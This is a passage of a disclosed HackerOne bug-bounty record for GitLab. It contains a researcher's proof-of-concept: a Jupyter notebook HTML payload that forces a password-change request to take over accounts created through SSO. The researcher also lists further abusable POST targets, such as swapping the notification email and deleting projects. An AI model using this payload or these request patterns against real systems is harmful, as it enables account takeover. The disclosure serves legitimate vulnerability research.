        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 15258503,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi team and @dcouture , I know that this one is planned to get fixed soon, but I have some additional updates. I have managed to escalate this bug to a full account takeover under specific conditions on GitLab.com. \n\nThis is of interest as an \"admin takeover\" as described above might be tricky to pull of on GitLab.com. But account takeover of regular users on the main platform is a big security risk. The attack only works if the user uses an SSO (single sign on) flow to authenticate to GitLab and have never set up a \"real password\" to the account. I don't know how prevalent this is but should not be too uncommon as SSO through Google account is a common way to sign up to other applications.\n\nWhen a user wants to update the account password, the regular flow is to go to https://gitlab.com/-/profile/password/edit and enter\n\n1. Your old password (for protection against fraudulent updates)\n2. The new password\n3. The new password a second time\n\nIt turns out that if the user have signed up with SSO there is no \"old password\" field and the user can set a password to the account just by entering\n\n1. New password\n2. New password again\n\nWhen clicking on \"Save\" a `POST` request is made with the body content of\n\n* `_method=put`\n* `authenticity_token=AUTENTICITY_TOKEN`\n* `user[new_password]=PASSWORD`\n* `user[password_confirmation]=PASSWORD`\n\nThis is a `PUT` request functionality made within a `POST` request. And as it turns out, the `authenticity_token` can be omitted IF a `X-Csrf-Token` header is present in the request. This makes this a candidate to use in the reported arbitrary `POST` attack described in this report. As an example, using this POC \n```json\n{\n  \"cells\": [\n    {\n      \"cell_type\": \"code\",\n      \"outputs\": [\n        {\n          \"output_type\": \"display_data\",\n          \"data\": {\n            \"text/html\": [\n              \"<a href class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/-/profile/password?_method=put&user%5Bnew_password%5D=Hacker001&user%5Bpassword_confirmation%5D=Hacker001\\\">\",\n              \"click to refresh\",\n              \"</a>\"\n            ]\n          }\n        }\n      ]\n    }\n  ]\n}\n```\nThe request that is sent to `https://gitlab.com/-/profile/password` would add the password Hacker001 to the victim account if a password were not already present (due to SSO). The attacker now has complete control over the victim account.\n\nCompared to the previously mentioned attacks this is not as critical as gaining admin access, but worse than getting SSH access as a complete account takeover could lead to identity theft and in the worst case spread to let the attacker take over subsequent accounts on other platforms if SSO is handled poorly by the user.\n\nAnd to expand even further on the underlying issue here: There are a lot of settings and modifications to a user's profile and data that uses the same scheme of using `POST` requests with parameters like `_method=PUT`, `_method=DELETE` and `_method=PATCH` and the `authenticity_token` instead of proper HTTP methods and `X-Csrf-Token` header. They all seam to be possible to target with the `arbitrary POST` attack (especially as multiple sequential requests are achievable). Some interesting ones are\n\n* Adding an email address and changing the user notification email to the attacker's newly added email\n    1. `POST /-/profile/emails email[email]=asd@asd.se`\n    2. `POST /-/profile/notifications _method=put&user[notification_email]=asd@asd.se&user[email_opted_in]=0`\n\n* Changing project visibility settings (`_method=PATCH`) trough calls to `/GROUP/PROJECT`\n\n* Deleting a project/group (`_method=DELETE`) through a call to `/GROUP/PROJECT`\n\n* Changing use profile (name, bio, links) through (`_method=PUT`) calls to `/-/profile`\n\n### Question\nI actually think that the issue of not requiring any additional confirmation when adding the first password after SSO constitutes a security risk on its own (as any `arbitrary POST` or `XSS` could abuse the same vector). But I don't know if it is possible to report an issue that rely on additional security flaws to be achievable. So I thought that I will put it here as it does add to the attack performable by the initial report. __Is this issue worth reporting on its own, or should I just leave it?__\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-01-31T08:44:59.693Z",
      "updated_at": "2022-01-31T08:44:59.693Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 15265372,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @joaxcar,\n\nThanks for the details. It's not worth reporting on its own for the reason you pointed out (it relies on additional security flaws) but it will be considered when assessing the full impact of your report.\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-01-31T13:25:46.412Z",
      "updated_at": "2022-01-31T13:25:46.412Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 15339374,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2022-02-04T19:44:35.886Z",
      "updated_at": "2022-02-04T19:44:35.886Z",
      "additional_data": {
        "old_severity": "High (7.3)",
        "new_severity": "High (7.7)",
        "old_severity_id": 1313408,
        "new_severity_id": 1386022
      },
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 15339379,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hi @joaxcar,\n\nThank you again for the report! Your finding has been patched in GitLab version 14.7.1 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker. If you'd like to publicly disclose this report or details of it in a blog post or elsewhere, please allow 30 days to pass before doing so to give time to our customers to upgrade to a patched version.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-02-04T19:45:08.180Z",
      "updated_at": "2022-02-04T19:45:08.180Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "joaxcar",
        "url": "/joaxcar"
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 15339383,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-02-04T19:45:37.145Z",
      "updated_at": "2022-02-04T19:45:37.145Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "7690.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "joaxcar",
        "url": "/joaxcar"
      }
    },
    {
      "id": 15361294,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Wow thank you for an amazing bounty GitLab and @dcouture ! even if I am still sad that I did not make it all the way to the  keyboard swag.. Will have to step up my game until the next \"end of year\" event :)\n\nI have confirmed that the patch mitigates the immediate risk described in the report. I guess that you are aware of it, but thought that I could still mention that the fix only effect Notebook output cells. Which mean that similar attacks are possible if HTML injections are found elsewhere on the platform. Even if the output is filtered with `v-html-safe`, as your default DOMpurify settings allows for arbitrary data attributes (minus the rails ones).\n\nAgain great job and thank you for the award!\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-02-07T09:33:19.815Z",
      "updated_at": "2022-02-07T09:33:19.815Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16068502,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Hi @dcouture , could we disclose this one? Maybe just redact the videos if possible.\n\nOther than that there is nothing sensitive in here from what I can see.\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-03-29T14:25:04.584Z",
      "updated_at": "2022-03-29T14:25:04.584Z",
      "first_to_agree": true,
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16789851,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @dcouture just a ping for the request to disclose if possible? Removing videos would be great, otherwise there is nothing sensitive there.\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2022-05-20T10:12:34.299Z",
      "updated_at": "2022-05-20T10:12:34.299Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16794368,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-05-20T14:32:25.474Z",
      "updated_at": "2022-05-20T14:32:25.474Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16794369,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-05-20T14:32:25.677Z",
      "updated_at": "2022-05-20T14:32:25.677Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}